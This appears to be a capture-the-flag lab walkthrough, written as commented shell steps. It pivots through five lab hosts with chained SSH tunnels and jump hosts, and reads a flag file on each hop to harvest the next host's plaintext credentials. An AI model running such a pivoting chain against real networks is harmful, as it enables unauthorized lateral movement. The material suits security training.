# =========================================
# 1. LOCAL → attacker
# (attacker PC creds: attacker / attacker
# =========================================
ssh attacker@172.28.0.10


# =========================================
# 2. attacker → PC1
# (PC1 creds: user-1 / franklin
# =========================================
ssh user-1@172.28.0.11
cat /flag.txt
# (get PC2 creds: user-2 / billybob)
exit


# =========================================
# 3. attacker: TUNNEL to PC2 THROUGH PC1
#    - This opens a shell on PC1 AND forwards local port 9001 → PC2:22
# =========================================
ssh -L 9001:172.29.0.11:22 user-1@172.28.0.11


# =========================================
# 4. LOCAL → PC2 (via attacker→PC1 tunnel)
#    (run this in a NEW terminal on your local machine)
# =========================================
ssh user-2@localhost -p 9001
cat /flag.txt
# (get PC3 creds: user-3 / marigold)
# stay on PC2 for the next step


# =========================================
# 5. PC2: TUNNEL to PC3
#    - Forwards PC2 local port 9002 → PC3:22
# =========================================
ssh -L 9002:172.30.0.30:22 user-3@172.30.0.30
# (this gives you a shell on PC3 AND opens the tunnel on PC2)


# =========================================
# 6. LOCAL → PC3 (multi-hop: local → attacker → PC1 → PC2 → PC3)
#    - You now have:
#      local:9001 → PC2
#      PC2:9002   → PC3
#    - So from LOCAL, you chain to PC3 via PC2’s forwarded port
#    (new local terminal)
# =========================================
ssh -J user-2@localhost:9001 user-3@localhost -p 9002
cat /flag.txt
# (get PC4 creds: user-4 / velvet)
# stay on PC3 for the next step


# =========================================
# 7. PC3: TUNNEL to PC4
#    - Forwards PC3 local port 9003 → PC4:22
# =========================================
ssh -L 9003:172.31.0.40:22 user-4@172.31.0.40
# (you now have a shell on PC4 AND a tunnel on PC3)


# =========================================
# 8. LOCAL → PC4 (full chain)
#    - local → attacker → PC1 → PC2 → PC3 → PC4
#    (new local terminal)
# =========================================
ssh -J user-2@localhost:9001,user-3@localhost:9002 user-4@localhost -p 9003
cat /flag.txt
# (get PC5 creds: final-user / lastone)
# stay on PC4 for the next step


# =========================================
# 9. PC4: TUNNEL to PC5
#    - Forwards PC4 local port 9004 → PC5:22
# =========================================
ssh -L 9004:172.32.0.50:22 final-user@172.32.0.50
# (you now have a shell on PC5 AND a tunnel on PC4)


# =========================================
# 10. LOCAL → PC5 (full chain to final target)
#     - local → attacker → PC1 → PC2 → PC3 → PC4 → PC5
# =========================================
ssh -J user-2@localhost:9001,user-3@localhost:9002,user-4@localhost:9003 final-user@localhost -p 9004
cat ~/welldone.txt
